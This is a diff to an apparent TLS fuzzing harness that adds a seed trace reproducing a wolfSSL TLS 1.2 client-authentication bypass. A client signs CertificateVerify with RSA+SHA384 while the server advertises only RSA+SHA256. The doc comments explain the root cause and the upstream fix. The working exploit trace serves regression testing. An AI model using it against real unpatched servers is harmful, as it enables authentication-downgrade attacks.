@@ -1514,6 +1514,261 @@ pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
     }
 }
 
+/// <https://www.wolfssl.com/docs/security-vulnerabilities/> (CVE-2025-12889)
+///
+/// Root cause: in TLS 1.2, `DoCertificateVerify()` (`src/internal.c`) decodes
+/// the 2-byte `hashSigAlgo` field of the client's `CertificateVerify` message
+/// straight from client-controlled bytes and uses it to pick the digest for
+/// verifying the client's signature (`SetDigest(ssl, ssl->options.peerHashAlgo)`),
+/// without ever checking it against `ssl->suites->hashSigAlgo` -- the exact
+/// set the server itself advertised in
+/// `CertificateRequest.supported_signature_algorithms`. The only related
+/// checks present pre-patch (matching signature-algorithm family against the
+/// peer's actual key type) are `WOLFSSL_MSG`-logged only, never enforced.
+/// Fixed upstream in wolfSSL PR #9395 (released in 5.8.4) by adding a
+/// `SupportedHashSigAlgo()` check before decoding. CWE-757 (Selection of
+/// Less-Secure Algorithm During Negotiation).
+///
+/// Reachability: wire-reachable while parsing an attacker-controlled
+/// handshake message during TLS 1.2 client-certificate authentication (no
+/// PUT-config-only state involved). Not a memory-safety bug -- this is a
+/// pure authentication-policy bypass: a malicious/compromised client can
+/// sign `CertificateVerify` under any (hash, signature) pair its key
+/// supports, regardless of what the server listed in `CertificateRequest`,
+/// and a vulnerable server accepts it as valid proof of possession anyway
+/// (enabling e.g. SLOTH-style digest-downgrade attacks against TLS 1.2
+/// client auth).
+///
+/// This seed configures the server to advertise *only* `RSA+SHA256` via
+/// `TLSDescriptorConfig::sigalgs` (-> `wolfSSL_CTX_set1_sigalgs_list` ->
+/// `ssl->suites->hashSigAlgo`, the exact array `SupportedHashSigAlgo` should
+/// check), then has the (attacker) client sign `CertificateVerify` with a
+/// genuinely valid `RSA_PKCS1_SHA384` signature -- a pair the server never
+/// offered. On a vulnerable build the handshake completes successfully
+/// despite the digest downgrade; on a patched build the server rejects the
+/// message with `INVALID_PARAMETER` before the handshake can finish.
+pub fn seed_cve_2025_12889(server: AgentName) -> Trace<TLSProtocolTypes> {
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_cipher_suites_make(
+                (fn_append_cipher_suite(
+                  (fn_new_cipher_suites()),
+                  fn_cipher_suite12
+            )))),
+            fn_compressions,
+            (fn_client_extensions_make(
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            (fn_client_extensions_append(
+                                (fn_client_extensions_append(
+                                    fn_client_extensions_new,
+                                    (fn_support_group_extension_make(
+                                        (fn_support_group_extension_append(
+                                            fn_support_group_extension_new,
+                                            fn_named_group_secp384r1
+                                        ))
+                                    ))
+                                )),
+                                (fn_signature_algorithm_extension(
+                                    (fn_supported_signature_schemes_extension_append(
+                                        (fn_supported_signature_schemes_extension_append(
+                                            fn_supported_signature_schemes_extension_new,
+                                            fn_sig_scheme_rsa_pkcs1_sha256
+                                        )),
+                                        fn_rsa_pkcs1_sha384_signature_algorithm
+                                    ))
+                                ))
+                            )),
+                            fn_ec_point_formats_extension
+                        )),
+                        fn_signed_certificate_timestamp_extension
+                    )),
+                     // Enable Renegotiation
+                    (fn_renegotiation_info_extension((fn_payload_u8(fn_empty_bytes_vec))))
+                )),
+                // Add signature cert extension
+                fn_signature_algorithm_cert_extension
+            ))
+        )))
+    };
+
+    // Buffers raw (unhashed) message bytes alongside the usual running hash,
+    // so the CertificateVerify below can be signed under an explicitly
+    // chosen hash algorithm (RSA_PKCS1_SHA384) independent of the
+    // handshake's own negotiated PRF hash (SHA256) -- see
+    // fn_new_transcript12_client_auth / fn_rsa_sign_client12.
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript12_client_auth,
+                (@client_hello) // ClientHello
+            )),
+            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]) // plaintext ServerHello
+        )
+    };
+
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_transcript),
+            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::Certificate)))]) // Certificate
+        )
+    };
+
+    let server_key_exchange_transcript = term! {
+      fn_append_transcript(
+            (@certificate_transcript),
+            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]) // ServerKeyExchange
+        )
+    };
+
+    let certificate_request_transcript = term! {
+      fn_append_transcript(
+            (@server_key_exchange_transcript),
+            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::CertificateRequest)))]) // CertificateRequest
+        )
+    };
+
+    let server_hello_done_transcript = term! {
+      fn_append_transcript(
+            (@certificate_request_transcript),
+            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHelloDone)))]) // ServerHelloDone
+        )
+    };
+
+    let client_certificate = term! {
+        fn_certificate(
+            (fn_append_certificate(
+                fn_new_certificates,
+                (fn_certificate_from_vec_u8(fn_bob_cert))
+            ))
+        )
+    };
+
+    let client_certificate_transcript = term! {
+      fn_append_transcript(
+            (@server_hello_done_transcript),
+            (@client_certificate)
+        )
+    };
+
+    let client_key_exchange = term! {
+        fn_client_key_exchange(
+            (fn_encode_ec_pubkey12(
+                (fn_payload_u8((fn_new_pubkey12(fn_named_group_secp384r1))))
+            ))
+        )
+    };
+
+    let client_key_exchange_transcript = term! {
+      fn_append_transcript(
+            (@client_certificate_transcript),
+            (@client_key_exchange)
+        )
+    };
+
+    // Malicious CertificateVerify: claims RSA_PKCS1_SHA384, a pair never
+    // offered by the server (sigalgs restricted to "RSA+SHA256" below). The
+    // signature is nonetheless cryptographically valid, computed over the
+    // raw transcript bytes buffered by the client-auth transcript above.
+    let certificate_verify = term! {
+        fn_certificate_verify(
+            fn_rsa_pkcs1_sha384_signature_algorithm,
+            (fn_payload_u16(
+                (fn_rsa_sign_client12(
+                    (fn_get_raw_transcript12((@client_key_exchange_transcript))),
+                    fn_bob_key,
+                    fn_rsa_pkcs1_sha384_signature_algorithm
+                ))
+            ))
+        )
+    };
+
+    let certificate_verify_transcript = term! {
+      fn_append_transcript(
+            (@client_key_exchange_transcript),
+            (@certificate_verify)
+        )
+    };
+
+    let client_verify_data = term! {
+        fn_client_sign_transcript(
+            ((server, 0)),
+            (fn_decode_server_ecdh_pubkey(
+                ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
+            )),
+            (@certificate_verify_transcript),
+            fn_named_group_secp384r1,
+            fn_new_random,
+            fn_cipher_suite12
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            server,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::V1_2,
+                typ: AgentType::Server,
+                client_authentication: true,
+                // Server only accepts/advertises RSA+SHA256 in its
+                // CertificateRequest -- the attacker-client signs
+                // CertificateVerify with RSA+SHA384 instead, which a
+                // vulnerable server accepts anyway (missing
+                // SupportedHashSigAlgo check).
+                sigalgs: Some("RSA+SHA256".to_string()),
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { client_hello }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { client_certificate }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { client_key_exchange }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { certificate_verify }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! { fn_change_cipher_spec } }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt12(
+                            (fn_finished((@client_verify_data))),
+                            ((server, 0)),
+                            (fn_decode_server_ecdh_pubkey(
+                                ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
+                            )),
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_0,
+                            fn_new_random,
+                            fn_cipher_suite12
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use puffin::algebra::TermType;
@@ -1535,6 +1790,7 @@ pub mod tests {
             seed_freak.build_named_trace(),
             seed_cve_2022_25640_simple.build_named_trace(),
             seed_cve_2022_38153.build_named_trace(),
+            seed_cve_2025_12889.build_named_trace(),
             // TODO: 685 seed_cve_2022_39173.build_named_trace(),
             // TODO: 1695 seed_cve_2022_39173_full.build_named_trace(),
             // TODO: 322 seed_cve_2022_39173_minimized.build_named_trace(),
